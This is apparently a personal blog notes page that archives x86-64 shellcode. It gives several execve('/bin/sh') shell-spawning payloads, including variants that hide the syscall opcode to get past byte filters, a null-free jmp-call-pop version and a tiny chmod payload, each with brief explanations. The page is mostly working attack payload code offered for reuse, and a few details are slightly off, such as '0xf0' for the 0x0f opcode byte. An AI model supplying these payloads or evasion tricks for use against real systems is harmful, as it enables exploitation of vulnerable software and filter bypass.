---
title: Shellcode Series
published: 2025-10-20
description: A page for various shellcode.
tags: [Shellcode, Assembly]
category: Notes 
draft: false
---

Hey readers , this page going to be a archive for various shellcode as I explore more in other architecture or even for some unique shellcode that going to write in future.

# x86-64 shellcode

## Shellcode without direct syscall or int 0x80
```asm
    xor     rax, rax
    movabs  rbx, 0x0068732f6e69622f     /* move /bin/sh\x00 to rax */
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    push    rsi
    push    rdi
    mov     rsi, rsp
    xor     rdx, rdx
    mov     rax, 59
    call    after_movabs
movi:
    movabs  rcx, 0x112233445566050f      
after_movabs:
    pop     rbx
    add     rbx, 2
    jmp     rbx
```
The above shellcode is a indirect syscall to execve.
How this works , when after_movabs is called , next instruction address is pushed onto the stack , so pop rbx, holds this address and with add rbx+2 , it now points address where 0xf0 is, so when rbx jump to it with next address holds 0x05 , it decodes as syscall and executes it.

## Shellcode without syscall or int 0x80
[it even bypasses byte sequences filter.]
```asm
48 b8 2f 62 69 6e 2f 73 68 00 ; movabs rax, 0x68732f6e69622f
50                            ; push rax
54                            ; push rsp
5f                            ; pop rdi
31 c0                         ; xor eax, eax
48 31 d2                      ; xor rdx, rdx
b0 3b                         ; mov al, 0x3b
48 31 f6                      ; xor rsi, rsi
48 c7 c1 05 00 00 00          ; mov rcx, 5
48 c1 e1 08                   ; shl rcx, 8
b1 0f                         ; mov cl, 0xf
51                            ; push rcx
48 89 e1                      ; mov rcx, rsp
ff d1                         ; call rcx
```
The above shellcode is a indirect syscall to execve.
This works by moving value 0x05 to the rcx then a left shift so that it looks like this i.e.0x0500 then with mov cl,0x0f it forms to 0x050f , then it is pushed to the stack and with call to the rcx.

NOTE: The downfall of this shellcode is that , we can only call syscall one time after that it goes to executing some instruction next to it.


## A 10 byte shellcode :chmod("a",7)
```asm
c6 07 61                      ; mov byte ptr [rdi], 0x61
6a 07                         ; push 7
5e                            ; pop rsi
b0 5a                         ; mov al, 0x5a
0f 05                         ; syscall 
```

This is a simple 10 byte shellcode for chmod.

## No null byte
```asm
jmp short get_string

start:
    pop    rdi            
    xor    eax, eax
    push   rax           
    push   rdi     
    pop    rdi       
    xor    edx, edx  
    push   rdx
    pop    rsi     
    mov    al, 59         
    syscall

get_string:
    call   start
    .byte 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68 
```

The above shellcode is a syscall to execve without any null byes in it.
